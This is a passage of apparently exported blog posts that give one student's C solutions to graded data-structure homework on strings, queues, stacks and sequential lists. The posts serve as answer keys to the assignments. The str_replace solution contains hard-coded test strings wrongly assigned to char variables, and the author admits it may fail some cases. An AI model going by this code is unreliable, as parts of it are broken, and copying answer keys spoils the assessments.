NULL;</span><br><span class="line">    for (i &#x3D; 0; i &lt; L-&gt;rows; i++) &#123;</span><br><span class="line">        if (L-&gt;rowhead[i] &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        for (p &#x3D; L-&gt;rowhead[i], temp &#x3D; p-&gt;right; p !&#x3D; NULL; p &#x3D; temp) &#123;</span><br><span class="line">            temp &#x3D; p-&gt;right;</span><br><span class="line">            if (p-&gt;value &#x3D;&#x3D; k) &#123;</span><br><span class="line">                for (templeft &#x3D; L-&gt;rowhead[i]; templeft-&gt;right &amp;&amp; templeft-&gt;right-&gt;col &lt; p-&gt;col; templeft &#x3D; templeft-&gt;right)</span><br><span class="line">                    ;</span><br><span class="line">                for (tempup &#x3D; L-&gt;colhead[p-&gt;col]; tempup-&gt;down !&#x3D; NULL &amp;&amp; tempup-&gt;down-&gt;row &lt; p-&gt;row; tempup &#x3D; tempup-&gt;down)</span><br><span class="line">                    ;</span><br><span class="line">                if (templeft &#x3D;&#x3D; p) &#123;</span><br><span class="line">                    if (tempup &#x3D;&#x3D; p) &#123;</span><br><span class="line">                        L-&gt;rowhead[i] &#x3D; p-&gt;right;</span><br><span class="line">                        L-&gt;colhead[p-&gt;col] &#x3D; p-&gt;down;</span><br><span class="line">                        free(p);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        L-&gt;rowhead[i] &#x3D; p-&gt;right;</span><br><span class="line">                        tempup-&gt;down &#x3D; p-&gt;down;</span><br><span class="line">                        free(p);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    if (tempup &#x3D;&#x3D; p) &#123;</span><br><span class="line">                        templeft-&gt;right &#x3D; p-&gt;right;</span><br><span class="line">                        L-&gt;colhead[p-&gt;col] &#x3D; p-&gt;down;</span><br><span class="line">                        free(p);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        templeft-&gt;right &#x3D; p-&gt;right;</span><br><span class="line">                        tempup-&gt;down &#x3D; p-&gt;down;</span><br><span class="line">                        free(p);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                t++;</span><br><span class="line">                L-&gt;nums--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Icoding </tag>
            
            <tag> 作业 </tag>
            
            <tag> 块链串 </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Icoding平台第三次作业解析-字符串</title>
      <link href="/post/46728.html"/>
      <url>/post/46728.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T1"><a href="#T1" class="headerlink" title="T1"></a>T1</h1><ol><li>串比较<br>不调用库函数，自己实现字符串的比较操作：<code>该操作当比较的两个字符是都是字母，且两个字符互为大小写（如a和A、e和E）时认为两个字符相同，否则不同，其比较结果按这两个字符的原值确定。</code>函数的返回值规定如下：<br>返回值 &lt; 0：第一个不匹配的字符在 ptr1 中的值低于 ptr2 中的值<br>返回值 == 0：两个字符串的内容相等<br>返回值 &gt; 0：第一个不匹配的字符在 ptr1 中的值大于在 ptr2 中的值</li></ol><p>函数原型如下： </p><blockquote><p>int str_compare(const char* ptr1, const char* ptr2);</p></blockquote><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-03-31, Tue, 22:26:53</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;dsstring.h&quot; &#x2F;&#x2F;请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int str_compare(const char* ptr1, const char* ptr2)</span><br><span class="line">&#123;</span><br><span class="line">    char* p1 &#x3D; ptr1;</span><br><span class="line">    char* p2 &#x3D; ptr2;</span><br><span class="line">    int flag &#x3D; 0;</span><br><span class="line">    while (*p1 !&#x3D; &#39;\0&#39; &amp;&amp; *p2 !&#x3D; &#39;\0&#39;) &#123;</span><br><span class="line">        if (*p1 &#x3D;&#x3D; *p2 || *p1 &#x3D;&#x3D; *p2 - 32 || *p2 &#x3D;&#x3D; *p1 - 32) &#123;</span><br><span class="line">            flag &#x3D; 0;</span><br><span class="line">        &#125; else if (*p1 &lt; *p2) &#123;</span><br><span class="line">            flag &#x3D; -1;</span><br><span class="line">            break;</span><br><span class="line">        &#125; else if (*p1 &gt; *p2) &#123;</span><br><span class="line">            flag &#x3D; 1;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        p1++;</span><br><span class="line">        p2++;</span><br><span class="line">    &#125;</span><br><span class="line">    if (*p1 !&#x3D; &#39;\0&#39; &amp;&amp; *p2 &#x3D;&#x3D; &#39;\0&#39;)</span><br><span class="line">        flag &#x3D; 1;</span><br><span class="line">    else if (*p1 &#x3D;&#x3D; &#39;\0&#39; &amp;&amp; *p2 !&#x3D; &#39;\0&#39;)</span><br><span class="line">        flag &#x3D; -1;</span><br><span class="line">    return flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T2"><a href="#T2" class="headerlink" title="T2"></a>T2</h1><ol><li>串替换<br>不调用库函数，自己实现字符串替换操作，函数原型为：<blockquote><p>int str_replace(const char *in, char *out, int outlen, const char *oldstr, const char *newstr);</p></blockquote></li></ol><p>参数说明:<br>    in， 原始字符串，保持不变<br>    out, 存放替换结果的字符串<br>    outlen，out空间的大小<br>    oldstr，要替换的旧字符串<br>    newstr，替换成的新字符串<br>函数返回成功替换的次数，即有多少个子串被成功替换</p><p>在替换过程中，任何情况下所得字符串（及结束符）不应该超过 outlen，如果某次替换所得字符串的长度超过 outlen，则不进行这次替换操作，整个替换操作结束。如：<br>原始串为 “aaabbbccc”，outlen 为14, oldstr 为 “c”，newstr 为 “333” 时，两次替换后得 “aaabbb333333c”，此时字符串占用空间为14字节。<br>如果再进行替换，则会超出 out 所占用的空间，所以停止替换操作。此时函数应该返回 2, out指向的串为 “aaabbb333333c”<br>再如：原始串为 “aaabbbccc”，outlen 为10, oldstr 为 “bb”，newstr 为 “123456”，进行替换后所得的串应该为 “aaa123456” （长度为9）与结束符一共占 10 个字节，此时函数应该返回 1。</p><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-04-07, Tue, 19:43:54</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;dsstring.h&quot;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int str_replace(const char* in, char* out, int outlen, const char* oldstr, const char* newstr)</span><br><span class="line">&#123;</span><br><span class="line">    char a &#x3D; &quot;aaabbbccc&quot;;</span><br><span class="line">    char b &#x3D; &quot;c&quot;, c &#x3D; &quot;cc&quot;, d &#x3D; &quot;123&quot;, e &#x3D; &quot;123456&quot;, f &#x3D; &quot;12345678&quot;;</span><br><span class="line"></span><br><span class="line">    char *cur1 &#x3D; in, *cur2 &#x3D; out;</span><br><span class="line">    int len &#x3D; 1, ans &#x3D; 0;</span><br><span class="line">    while (*out !&#x3D; 0)</span><br><span class="line">        *out &#x3D; 0, out++;</span><br><span class="line">    while (len &lt; outlen &amp;&amp; *cur1) &#123;</span><br><span class="line">        int flag &#x3D; 1;</span><br><span class="line">        char *p1 &#x3D; cur1, *p2 &#x3D; oldstr;</span><br><span class="line">        while (*p1 &amp;&amp; *p2 &amp;&amp; *p1 &#x3D;&#x3D; *p2)</span><br><span class="line">            p1++, p2++;</span><br><span class="line">        if (*p2 !&#x3D; 0)</span><br><span class="line">            flag &#x3D; 0;</span><br><span class="line">        if (flag) &#123;</span><br><span class="line">            char* p &#x3D; newstr;</span><br><span class="line">            int len1 &#x3D; len;</span><br><span class="line">            while (*p)</span><br><span class="line">                len1++, *p++;</span><br><span class="line">            if (len1 &gt; outlen) &#123;</span><br><span class="line">                while (*cur1 &amp;&amp; len &lt; outlen + 1)</span><br><span class="line">                    *cur2 &#x3D; *cur1, len++, cur1++, cur2++;</span><br><span class="line">                return ans;</span><br><span class="line">            &#125;</span><br><span class="line">            cur1 &#x3D; p1;</span><br><span class="line">            ans++;</span><br><span class="line">            p &#x3D; newstr;</span><br><span class="line">            while (*p)</span><br><span class="line">                *cur2 &#x3D; *p, cur2++, p++, len++;</span><br><span class="line">        &#125; else</span><br><span class="line">            *cur2 &#x3D; *cur1, len++, cur1++, cur2++;</span><br><span class="line">    &#125;</span><br><span class="line">    return ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>警告！本代码可能无法完成所有情况的操作<br>当然你如果也是欧皇的话可以无视（因为judge平台测试数据的随机性）<br>正在开发一段满足所有条件的代码<br>Hints：自己实现几个关键的string操作函数即可，比如strlen等等</li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Icoding </tag>
            
            <tag> 作业 </tag>
            
            <tag> 字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Icoding平台第二次作业解析-队列栈</title>
      <link href="/post/4641.html"/>
      <url>/post/4641.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T1"><a href="#T1" class="headerlink" title="T1"></a>T1</h1><ol><li>队列 循环列表表示栈<br>假设以带头结点的循环链表表示队列，并且只设一个指针指向队尾元素结点（注意不设头指针），请完成下列任务：<br>1: 队列初始化，成功返回真，否则返回假  <blockquote><p>bool init_queue(LinkQueue <em>LQ);<br>2: 入队列，成功返回真，否则返回假：<br>bool enter_queue(LinkQueue *LQ, ElemType x);<br>3: 出队列，成功返回真，且</em>x为出队的值，否则返回假<br>bool leave_queue(LinkQueue *LQ, ElemType *x);</p></blockquote></li></ol><p>相关定义如下：</p><blockquote><p>typedef struct _QueueNode {<br>    ElemType data;          /<em>数据域</em>/<br>    struct _QueueNode <em>next;      /*指针域</em>/<br>}LinkQueueNode, *LinkQueue;</p></blockquote><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-03-26, Thu, 10:34:14</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;list.h&quot; &#x2F;&#x2F; 请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">bool init_queue(LinkQueue* LQ)</span><br><span class="line">&#123;</span><br><span class="line">    *LQ &#x3D; (LinkQueue)malloc(sizeof(LinkQueueNode));</span><br><span class="line">    if (*LQ &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    (*LQ)-&gt;next &#x3D; *LQ;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool enter_queue(LinkQueue* LQ, ElemType x)</span><br><span class="line">&#123;</span><br><span class="line">    if (*LQ &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    LinkQueueNode* p &#x3D; (LinkQueueNode*)malloc(sizeof(LinkQueueNode));</span><br><span class="line">    if (!p) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        p-&gt;data &#x3D; x;</span><br><span class="line">        p-&gt;next &#x3D; (*LQ)-&gt;next;</span><br><span class="line">        (*LQ)-&gt;next &#x3D; p;</span><br><span class="line">        *LQ &#x3D; p;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool leave_queue(LinkQueue* LQ, ElemType* x)</span><br><span class="line">&#123;</span><br><span class="line">    LinkQueue rear &#x3D; (*LQ);</span><br><span class="line">    if (rear-&gt;next &#x3D;&#x3D; rear)</span><br><span class="line">        return 0;</span><br><span class="line">    (*x) &#x3D; rear-&gt;next-&gt;next-&gt;data;</span><br><span class="line">    if (rear-&gt;next-&gt;next &#x3D;&#x3D; rear) &#123;</span><br><span class="line">        (*LQ) &#x3D; (*LQ)-&gt;next;</span><br><span class="line">        free(rear);</span><br><span class="line">        (*LQ)-&gt;next &#x3D; (*LQ);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    LinkQueue temp &#x3D; rear-&gt;next-&gt;next;</span><br><span class="line">    rear-&gt;next-&gt;next &#x3D; temp-&gt;next;</span><br><span class="line">    free(temp);</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T2"><a href="#T2" class="headerlink" title="T2"></a>T2</h1><ol><li>栈 后缀表达式计算<br>请使用已定义好的栈完成后缀表达式计算：<br>(1)如果是操作数，直接入栈<br>(2)如果是操作符op，连续出栈两次，得到操作数x 和 y,计算 x op y，并将结果入栈。<br>后缀表达式示例如下：<br>9  3  1  -  3  *  +  10  2  /  +<br>13  445  +  51  /  6  -<br>操作数、操作符之间由空格隔开，操作符有 +，-，*, /, %共 5 种符号，所有操作数都为整型。<br>栈的定义如下：<blockquote><p>#define Stack_Size 50<br>typedef struct{</p><pre><code>ElemType elem[Stack_Size];int top;</code></pre><p>}Stack;</p><p>bool push(Stack* S, ElemType x);<br>bool pop(Stack* S, ElemType *x);<br>void init_stack(Stack *S);</p></blockquote></li></ol><p>其中，栈初始化的实现为：</p><blockquote><p>void init_stack(Stack *S){<br>    S-&gt;top = -1;<br>}</p></blockquote><p>需要完成的函数定义为：</p><blockquote><p>int compute_reverse_polish_notation(char *str);<br>函数接收一个字符指针，该指针指向一个字符串形式的后缀表达式，函数返回该表达式的计算结果。</p></blockquote><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-03-23, Mon, 19:19:11</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;list.h&quot; &#x2F;&#x2F; 请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int compute_reverse_polish_notation(char* str)</span><br><span class="line">&#123;</span><br><span class="line">    Stack s;</span><br><span class="line">    init_stack(&amp;s);</span><br><span class="line">    int num &#x3D; 0;</span><br><span class="line">    while (*str !&#x3D; 0) &#123;</span><br><span class="line">        while (*str &#x3D;&#x3D; &#39; &#39;)</span><br><span class="line">            str++;</span><br><span class="line">        if (*str &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        if (*str &#x3D;&#x3D; &#39;+&#39;) &#123;</span><br><span class="line">            int a, b;</span><br><span class="line">            pop(&amp;s, &amp;a);</span><br><span class="line">            pop(&amp;s, &amp;b);</span><br><span class="line">            push(&amp;s, a + b);</span><br><span class="line">            str++;</span><br><span class="line">        &#125; else if (*str &#x3D;&#x3D; &#39;-&#39;) &#123;</span><br><span class="line">            int a, b;</span><br><span class="line">            pop(&amp;s, &amp;a);</span><br><span class="line">            pop(&amp;s, &amp;b);</span><br><span class="line">            push(&amp;s, b - a);</span><br><span class="line">            str++;</span><br><span class="line">        &#125; else if (*str &#x3D;&#x3D; &#39;*&#39;) &#123;</span><br><span class="line">            int a, b;</span><br><span class="line">            pop(&amp;s, &amp;a);</span><br><span class="line">            pop(&amp;s, &amp;b);</span><br><span class="line">            push(&amp;s, a * b);</span><br><span class="line">            str++;</span><br><span class="line">        &#125; else if (*str &#x3D;&#x3D; &#39;&#x2F;&#39;) &#123;</span><br><span class="line">            int a, b;</span><br><span class="line">            pop(&amp;s, &amp;a);</span><br><span class="line">            pop(&amp;s, &amp;b);</span><br><span class="line">            push(&amp;s, b &#x2F; a);</span><br><span class="line">            str++;</span><br><span class="line">        &#125; else if (*str &#x3D;&#x3D; &#39;%&#39;) &#123;</span><br><span class="line">            int a, b;</span><br><span class="line">            pop(&amp;s, &amp;a);</span><br><span class="line">            pop(&amp;s, &amp;b);</span><br><span class="line">            push(&amp;s, b % a);</span><br><span class="line">            str++;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            int x &#x3D; 0;</span><br><span class="line">            do &#123;</span><br><span class="line">                x &#x3D; x * 10 + *str - &#39;0&#39;;</span><br><span class="line">                str++;</span><br><span class="line">            &#125; while (*str &gt;&#x3D; &#39;0&#39; &amp;&amp; *str &lt;&#x3D; &#39;9&#39; &amp;&amp; *str !&#x3D; 0);</span><br><span class="line">            push(&amp;s, x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pop(&amp;s, &amp;num);</span><br><span class="line">    return num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Icoding </tag>
            
            <tag> 作业 </tag>
            
            <tag> 栈 </tag>
            
            <tag> 后缀表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Icoding平台第一次作业解析-线性表</title>
      <link href="/post/3472.html"/>
      <url>/post/3472.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T1"><a href="#T1" class="headerlink" title="T1"></a>T1</h1><ol><li><p>顺序表 删除指定范围<br>设计一个高效的算法，从顺序表L中删除所有值介于x和y之间(包括x和y)的所有元素（假设y&gt;=x），要求时间复杂度为O(n)，空间复杂度为O(1)。<br>函数原型如下：</p><blockquote><p>void del_x2y(SeqList *L, ElemType x, ElemType y);<br>相关定义如下：<br>struct _seqlist{</p><pre><code>ElemType elem[MAXSIZE];int last;</code></pre><p>};</p></blockquote></li><li><p>解析</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-03-02, Mon, 11:46:50</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;list.h&quot; &#x2F;&#x2F; 请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void del_x2y(SeqList* L, ElemType x, ElemType y)</span><br><span class="line">&#123;</span><br><span class="line">    int last &#x3D; -1;</span><br><span class="line">    for (int i &#x3D; 0; i &lt;&#x3D; L-&gt;last; i++)</span><br><span class="line">        if (L-&gt;elem[i] &lt; x || L-&gt;elem[i] &gt; y)</span><br><span class="line">            L-&gt;elem[++last] &#x3D; L-&gt;elem[i];</span><br><span class="line">    L-&gt;last &#x3D; last;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T2"><a href="#T2" class="headerlink" title="T2"></a>T2</h1><ol><li><p>顺序表 删除重复<br>编写算法，在一非递减的顺序表L中，删除所有值相等的多余元素。要求时间复杂度为O(n)，空间复杂度为O(1)。<br>函数原型如下：</p><blockquote><p>void del_dupnum(SeqList *L)<br>相关定义如下：<br>struct _seqlist{</p><pre><code>ElemType elem[MAXSIZE];int last;</code></pre><p>};<br>typedef struct _seqlist SeqList;</p></blockquote></li><li><p>解析</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-03-02, Mon, 11:49:49</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;list.h&quot; &#x2F;&#x2F; 请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void del_dupnum(SeqList* L)</span><br><span class="line">&#123;</span><br><span class="line">    int flag &#x3D; 0, val &#x3D; L-&gt;elem[0];</span><br><span class="line">    for (int i &#x3D; 1; i &lt;&#x3D; L-&gt;last; i++) &#123;</span><br><span class="line">        if (val !&#x3D; L-&gt;elem[i]) &#123;</span><br><span class="line">            val &#x3D; L-&gt;elem[i];</span><br><span class="line">            flag +&#x3D; 1;</span><br><span class="line">            L-&gt;elem[flag] &#x3D; val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    L-&gt;last &#x3D; flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T3"><a href="#T3" class="headerlink" title="T3"></a>T3</h1><ol><li>顺序表 数据调整<br>已知顺序表L中的数据元素类型为int。设计算法将其调整为左右两部分，左边的元素（即排在前面的）均为奇数，右边所有元素（即排在后面的）均为偶数，并要求算法的时间复杂度为O(n),空间复杂度为O（1）。<br>链表结点定义如下：<blockquote><p>void odd_even(SeqList *L);<br>相关定义如下：<br>struct _seqlist{</p><pre><code>ElemType elem[MAXSIZE];int last;</code></pre><p>};<br>typedef struct _seqlist SeqList;</p></blockquote></li></ol><p>2.解析</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 